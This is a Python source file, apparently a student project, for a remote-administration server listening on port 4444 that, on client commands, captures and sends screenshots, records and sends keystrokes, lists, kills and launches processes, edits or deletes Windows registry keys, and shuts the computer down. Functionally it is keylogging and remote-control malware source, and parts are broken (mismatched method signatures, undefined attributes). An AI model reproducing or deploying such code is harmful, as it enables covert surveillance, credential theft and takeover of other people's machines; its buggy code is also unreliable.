import socket
import threading
import winreg
import pyautogui
import io
import time
import platform
import os
import subprocess
import sys
import psutil
from ipaddress import ip_address
from contextlib import closing
import tkinter as tk
from pynput import keyboard
import Program
import Keylog
from tkinter import *
import signal
from PIL import ImageGrab
import win32gui
import win32process
import ctypes

# HOST = '192.168.1.3'
PORT = 4444 #Server Port is listening
img_bytes = b'\x00\x01\x02...'

FONT = ("Arial", 20, "bold")
LOGIN = "login"
REGISTER = "register"
LOGOUT = "logout"
EXIT = "exit"


class Server:
    def __init__(self, host):
        self.host = ''# host
        print(self.host + " " + str(PORT))
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP
        self.server.bind((self.host, PORT))
        self.server.listen(10)
        print("Server started listening on port " + str(PORT))
        self.clients = []
        self.ns = None
        self.nr = None
        self.nw = None
        self.nr_lock = threading.Lock()
        self.nw_lock = threading.Lock()

    def start(self):
        try:
            print("SERVER: Waiting for Clients")
            while True:
                conn, addr = self.server.accept()
                print("Connected by", addr)
                self.clients.append((conn, addr))
                threading.Thread(target=self.handle_client, args=(conn,addr)).start()
                self.nr = conn.makefile("rb")
                self.nw = conn.makefile("wb")
        except socket.error as ex:
            print("Server error:", ex)
        finally:
            self.server.close()

    def stop(self):
        self.is_running = False  # Signal the server loop to stop
        for conn, _ in self.clients:
            conn.close()
        self.server.close()
        sys.exit(0)  # Close the socket to unlock the port
        
    def handle_client(self, conn, addr):
        self.clients.append(conn)
        try:
            while True:
                option = conn.recv(1024).decode("utf8")
                print("Client option: " + option)
                if option == "TAKEPIC":
                    self.screenshot(conn)
                elif option == "SHUTDOWN":
                    self.shutdown()
                # elif option == "REGISTRY":
                #     self.pc_registry(conn)
                elif option == "KEYLOG":
                    self.keylog(conn)
                elif option == "PROCESS":
                    self.process(conn)
                elif option == "APPLICATION":
                    self.application(conn)
                elif option == "QUIT":
                    break
                else:
                    conn.sendall(bytes("Option not found", "utf8"))
                    break
            # self.clients.shutdown(socket.SHUT_RDWR)
            #self.clients.close()
        except socket.timeout as timeout:
            print("Timeout to client: ", addr)
        except socket.error as error:
            print("Disconnected to client: ", addr)
        finally:    
            conn.close()
            self.clients.remove((conn, addr))

    def PCRegistryKey(self, conn):
        try:
            s = conn.recv(4092).decode("utf8")
            base_key, link, value_name, value, value_type = s.split(";")

            if value_type == "DELETE_VALUE":
                res = self.PCRemoveValue(base_key, link, value_name)
            elif value_type == "DELETE_KEY":
                res = self.PCRemoveKey(base_key, link)
            else:
                res = self.PCSetValue(
                    base_key, link, value_name, value, value_type)

            conn.sendall(bytes(res, "utf8"))
        except Exception as ex:
            conn.sendall(bytes("Error: " + str(ex), "utf8"))
    
    def PCRegistryValue(link):
        value = None
        if "\\" in link:
            value = link[link.index("\\")+1:]
        return value

    def PCSetValue(base_key, link, value_name, value, value_type):
        value_types = {
            "String": winreg.REG_SZ,
            "Binary": winreg.REG_BINARY,
            "DWORD": winreg.REG_DWORD,
            "QWORD": winreg.REG_QWORD,
            "Multi-String": winreg.REG_MULTI_SZ,
            "Expandable String": winreg.REG_EXPAND_SZ,
        }

        try:
            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
                if value_type in value_types:
                    if value_type == "Binary":
                        value_bytes = bytes(int(byte)
                                            for byte in value.split())
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], value_bytes)
                    elif value_type in ["DWORD", "QWORD"]:
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], int(value))
                    elif value_type == "Multi-String":
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], value.split())
                    else:
                        winreg.SetValueEx(key, value_name, 0,
                                          value_types[value_type], value)
                    return "Set value successfully"
                else:
                    return "Error: Invalid value type"
        except Exception as ex:
            return "Error: " + str(ex)

    def PCRemoveValue(base_key, link, value_name):
        try:
            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, value_name)
                return "Value deleted successfully"
        except Exception as ex:
            return "Error: " + str(ex)

    def PCRemoveKey(base_key, link):
        try:
            with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteKey(key, link)
                return "Key deleted successfully"
        except Exception as ex:
            return "Error: " + str(ex)

    def screenshot(self, conn):
        myScreenshot = pyautogui.screenshot()
        #img_bytes = io.BytesIO()
        #myScreenshot.save(img_bytes, format='PNG')
        myScreenshot.save(r'screenshot.png')
        # img_bytes = img_bytes.getvalue()
        # conn.sendall(len(img_bytes).to_bytes(4, 'big'))
        # conn.sendall(img_bytes)
        filename = r'screenshot.png'
        while True:
            with open(filename, 'rb') as fs:
                print("Sending file.")
                while True:
                    data = fs.read(1024)
                    conn.send(data)
                    if not data:
                        break
                fs.close()
                print("Sent file.")
                break
        print("Done sending")
        
    def shutdown(self):
        # Thuong thi os.name cua Linux hoac Mac la "posix"
        system_name = platform.system()
        if system_name == "Windows":
            #subprocess.run(["shutdown", "-s"])
            return os.system("shutdown /s /t 1")
        elif system_name == "Darwin" or system_name == "Linux":
            os.system("sudo shutdown -h now")
        else:
            print("Shutdown command not supported on this platform.")

    # def pc_registry(self, conn):
    #     try:
    #         data = conn.recv(4092).decode("utf8")

    #         base_key, link, value_name, value, value_type = data.split(";")

    #         if value_type == "DELETE_VALUE":
    #             res = self.PCRemoveValue(base_key, link, value_name)
    #         elif value_type == "DELETE_KEY":
    #             res = self.PCRemoveKey(base_key, link)
    #         else:
    #             res = self.PCSetValue(
    #                 base_key, link, value_name, value, value_type)

    #         self.send_response(conn, res)
    #     except Exception as ex:
    #         self.send_response(conn, "Error: " + str(ex))

    # def send_response(self, conn, response):
    #     conn.sendall(bytes(response, "utf8"))

    # def delete_value(base_key, link, value_name):
    #     try:
    #         with winreg.OpenKey(base_key, link, 0, winreg.KEY_SET_VALUE) as key:
    #             winreg.DeleteValue(key, value_name)
    #             return "Value deleted successfully"
    #     except Exception as ex:
    #         return "Error: " + str(ex)

    # def delete_key(base_key, link):
    #     try:
    #         winreg.DeleteKey(base_key, link)
    #         return "Key deleted successfully"
    #     except Exception as ex:
    #         return "Error: " + str(ex)

    # def send_response(self, conn, response):
    #     with self.nw_lock:
    #         conn.sendall(bytes(response, "utf8"))

    # def base_registry_key(self, link):
    #     base_key = None
    #     if "\\" in link:
    #         if link.startswith("HKEY_CLASSES_ROOT"):
    #             base_key = winreg.HKEY_CLASSES_ROOT
    #         elif link.startswith("HKEY_CURRENT_USER"):
    #             base_key = winreg.HKEY_CURRENT_USER
    #         elif link.startswith("HKEY_LOCAL_MACHINE"):
    #             base_key = winreg.HKEY_LOCAL_MACHINE
    #         elif link.startswith("HKEY_USERS"):
    #             base_key = winreg.HKEY_USERS
    #         elif link.startswith("HKEY_CURRENT_CONFIG"):
    #             base_key = winreg.HKEY_CURRENT_CONFIG
    #     return base_key

    # def registry(self, conn):
    #     while True:
    #         data = conn.recv(4092).decode("utf8")
    #         if data == "QUIT":
    #             return
    #         elif data == "SEND":
    #             option = conn.recv(1024).decode("utf8")
    #             link = conn.recv(1024).decode("utf8")
    #             value_name = conn.recv(1024).decode("utf8")
    #             value = conn.recv(1024).decode("utf8")
    #             value_type = conn.recv(1024).decode("utf8")
    #             base_key = self.base_registry_key(link)
    #             link2 = link[link.index("\\")+1:]
    #             if base_key is None:
    #                 res = "Error"
    #             else:
    #                 if option == "Create key":
    #                     base_key.CreateSubKey(link2)
    #                     res = "Key created successfully"
    #                 elif option == "Delete key":
    #                     res = self.PCRemoveKey(base_key, link2)
    #                 elif option == "Get value":
    #                     res = self.PCRegistryValue(base_key, link2, value_name)
    #                 elif option == "Set value":
    #                     res = self.PCSetValue(
    #                         base_key, link2, value_name, value, value_type)
    #                 elif option == "Delete value":
    #                     res = self.PCRemoveValue(base_key, link2, value_name)
    #                 else:
    #                     res = "Error"
    #             self.send_response(conn, res)

    # def hookKey(self):
    #     self.tklog.resume()
    #     open(Keylog.path, "w").close()

    # def unhook(self):
    #     self.tklog.suspend()

    # def printkeys(self):
    #     s = ""
    #     with open(Keylog.path, "r") as file:
    #         s = file.read()
    #     open(Keylog.path, "w").close()
    #     if not s:
    #         s = "\0"
    #     self.nw.write(s)
    #     self.nw.flush()

    def start_keylog (self, conn):
        with keyboard.Listener(on_press = self.on_key_press) as listener:
                listener.join()
    
    def on_key_press(self, key):
        try:
            key_str = str(key.char)
            self.write2logfile(key_str)
        except AttributeError:
            pass
    
    def write2logfile(self, key_str):
        with open("keylog.txt", "a") as log_file:
            log_file.write(key_str)
            
    def read_log_file (self):
        with open ("keylog.txt", "r") as log_file:
            return log_file.read()
        
    def stop_keylog (self):
        self.listener.stop()
        pass
    
    def keylog(self, conn):
        self.tklog = threading.Thread(target=Keylog.startKLog)
        self.tklog.start()
        while True:
            s = self.receiveSignal()
            if s == "PRINT":
                data = self.read_log_file()
                self.clients.send(data.encode())
            elif s == "HOOK":
                self.start_keylog()
            elif s == "UNHOOK":
                self.stop_keylog()
            elif s == "QUIT":
                self.clients.close()
                return

    def receiveSignal(self, conn):
        try:
            with self.nr_lock:
                signal_data = conn.recv(1024).decode("utf-8")
                return signal_data
        except Exception as e:
            print("Error receiving signal:", str(e))
            return ""

    def run_app(app_name):
        try:
            full_name = f"{app_name}.exe"
            subprocess.Popen(full_name)
            return f"{full_name} started successfully"
        except Exception as e:
            return f"Error starting {full_name}: {e}"

    def kill_app(self, pid):
        try:        
            # subprocess.call(["taskkill","/F","/IM",app_name])
            subprocess.call(["taskkill","/F","/PID",str(pid)])
            # os.system(f"taskkill /f /im {app_name}")
            return f"{pid} killed successfully"
        except Exception as e:
            return f"Error killing {pid}: {e}"

    def view_apps(self):
        try:
            processes = psutil.process_iter(attrs=['pid', 'name', 'num_threads'])
            app_list = []
            seen_pids = set()

            def enum_windows_callback(hwnd, _):
                if win32gui.IsWindowVisible(hwnd):
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    if pid in seen_pids:  # Check if PID has already been processed
                        return

                    seen_pids.add(pid)  # Add the PID to the set of seen PIDs

                    try:
                        p = psutil.Process(pid)
                        app_list.append(f"{p.name()}\t{pid}\t{p.num_threads()}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass

            win32gui.EnumWindows(enum_windows_callback, None)

            return '\n'.join(app_list)
        except Exception as e:
            return f"Error viewing apps: {e}"

    def handle_request(self, request, conn):
        request = request.strip().split()
        command = request[0]
        if command == "run":
            app_name = request[1]
            return self.run_app(app_name)
        elif command == "kill":
            app_name = request[1]
            print(app_name)
            return self.kill_app(app_name)
        elif command == "view":
            return self.view_apps()
        else:
            return "Invalid command"
    
    def application(self, conn):
        while True:
        # while True:
            ss = self.receiveSignal(conn)
            print(ss)
            s1 = ss.split()
            cm = s1[0] 
            data = s1[1]
            #print(ss[1])
            #if ss == "XEM" or ss == "view":
            if cm == "XEM" or cm == "view":
                response = self.view_apps()
                conn.send(response.encode())
            elif cm == "KILL" or cm == "kill":
                #app_name = self.receiveSignal(conn)
                pid = s1[1]
                print(pid)
                response = self.kill_app(pid)
                conn.send(response.encode())
            elif cm == "START" or cm == "start":
                # app_name = self.receiveSignal(conn)
                response = self.run_app(data)
                conn.send(response.encode())
            elif cm == "QUIT":
                return
        # while True:
        #     ss = self.receiveSignal(conn)
        #     if ss == "XEM":
        #         pr = psutil.process_iter(
        #             ['pid', 'name', 'num_threads', 'num_handles', 'memory_info'])
        #         self.nw.write(str(len(list(pr))) + "\n")
        #         for p in pr:
        #             try:
        #                 if p.info['name'] and p.info['name'] != "":
        #                     self.nw.write("ok\n")
        #                     self.nw.write(p.info['name'] + "\n")
        #                     self.nw.write(str(p.info['pid']) + "\n")
        #                     self.nw.write(str(p.info['num_threads']) + "\n")
        #                     self.nw.flush()
        #             except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        #                 pass

        #     elif ss == "KILL":
        #         while True:
        #             ss = self.receiveSignal()
        #             if ss == "KILLID":
        #                 u = self.receiveSignal()
        #                 test2 = False
        #                 if u:
        #                     try:
        #                         process = psutil.Process(int(u))
        #                         process.terminate()
        #                         self.nw.write("Đã diệt chương trình\n")
        #                         self.nw.flush()
        #                         test2 = True
        #                     except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        #                         pass

        #                 if not test2:
        #                     self.nw.write("Không tìm thấy chương trình\n")
        #                     self.nw.flush()
        #             elif ss == "QUIT":
        #                 break

        #     elif ss == "START":
        #         while True:
        #             ss = self.receiveSignal()
        #             if ss == "STARTID":
        #                 u = self.receiveSignal()
        #                 if u:
        #                     u += ".exe"
        #                     try:
        #                         subprocess.Popen(u, shell=True)
        #                         self.nw.write("Chương trình đã được bật\n")
        #                         self.nw.flush()
        #                     except Exception as ex:
        #                         self.nw.write("Lỗi\n")
        #                         self.nw.flush()
        #                 else:
        #                     self.nw.write("Lỗi\n")
        #                     self.nw.flush()
        #             elif ss == "QUIT":
        #                 break

        #     elif ss == "QUIT":
        #         return

    def process(conn):
        while True:
            data = conn.recv(4092).decode("utf8")
            if data == "QUIT":
                return
            elif data == "XEM":
                processes = subprocess.check_output(
                    ['wmic', 'process', 'get', 'name,processid']).decode().split("\r\r\n")
                conn.sendall(bytes(str(len(processes)), "utf8"))
                for process in processes:
                    name, pid = process.split()
                    conn.sendall(bytes(name, "utf8"))
                    conn.sendall(bytes(pid, "utf8"))
            elif data == "KILL":
                while True:
                    option = conn.recv(1024).decode("utf8")
                    if option == "KILLID":
                        pid = conn.recv(1024).decode("utf8")
                        try:
                            os.kill(int(pid), 9)
                            conn.sendall(bytes("Process killed", "utf8"))
                        except Exception as ex:
                            conn.sendall(bytes("Error", "utf8"))
                    elif option == "QUIT":
                        break
            elif data == "START":
                while True:
                    option = conn.recv(1024).decode("utf8")
                    if option == "STARTID":
                        name = conn.recv(1024).decode("utf8")
                        if name != "":
                            name += ".exe"
                            try:
                                subprocess.Popen(name)
                                conn.sendall(
                                    bytes("Process started successfully", "utf8"))
                            except Exception as ex:
                                conn.sendall(bytes("Error", "utf8"))
                    elif option == "QUIT":
                        break

    def button1_Click(self):
        ip = '' #'192.168.1.3'
        port = PORT
        with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as server:
            server.bind((ip, port))
            server.listen(100)

            client, _ = server.accept()
            ns = client.makefile('rwb')
            with self.nw_lock, self.nr_lock:
                self.nr = ns
                self.nw = ns

            while True:
                s = self.receiveSignal(client)
                print(s)
                if s == "KEYLOG":
                    self.keylog()
                elif s == "SHUTDOWN":
                    self.shutdown()
                elif s == "REGISTRY":
                    self.registry()
                elif s == "TAKEPIC":
                    self.screenshot()
                elif s == "PROCESS":
                    self.process()
                elif s == "APPLICATION":
                    self.application()
                elif s == "QUIT":
                    break

        client.shutdown(socket.SHUT_RDWR)
        client.close()

class ServerGUI(tk.Frame):
    def __init__(self, master=None, server=None):
        super().__init__(master)
        self.master = master
        self.server = server  # Store the server instance
        self.init_ui()

    def init_ui(self):
        self.master.title("Server")
        self.master.geometry("200x100")

        self.button1 = tk.Button(self, text="Open server", command=self.open_server)
        self.button1.pack(pady=20)

        self.pack()

    def open_server(self):
        self.process_click()

    def process_click(self):
        print("PROCESS command sent to the server.")
        
    def on_closing(self):
        if self.server:
            self.server.stop()  # Call the server's stop method
        self.master.destroy()

    def shutdown_server(self):
        # Implement your server shutdown logic here
        print("Shutting down the server...")
        self.server.stop()  # Call the server's stop method
        # For example, you could call your Server's shutdown method

def main():
    server = Server('0.0.0.0')
    server_thread = threading.Thread(target=server.start)
    server_thread.start()

    root = tk.Tk()
    server_app = ServerGUI(master=root)
    root.protocol("WM_DELETE_WINDOW", server_app.on_closing)  # Handle window closing event
    server_app.mainloop()
    
    server.stop()  # You should implement this method in your Server class
    server_thread.join()  # Wait for the server thread to finish before exiting
    
if __name__ == "__main__":
    main()


